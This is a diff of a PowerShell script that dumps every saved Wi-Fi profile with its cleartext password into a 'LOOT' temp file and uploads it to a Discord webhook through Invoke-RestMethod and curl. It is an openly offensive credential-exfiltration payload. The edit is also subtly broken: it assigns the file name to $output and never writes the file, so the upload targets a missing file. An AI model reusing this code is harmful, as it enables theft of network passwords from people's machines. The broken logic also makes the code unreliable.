@@ -1,9 +1,16 @@
 ############################################################################################################################################################
+$FileName = "$env:tmp/$env:USERNAME-LOOT-wifi-$(get-date -f yyyy-MM-dd_hh-mm).txt"
 
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
+$output = @"
+
+Profiles
+$wifiProfiles
+"@
+
+$output = $FileName
 
 ############################################################################################################################################################
 
@@ -30,7 +37,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
  
 
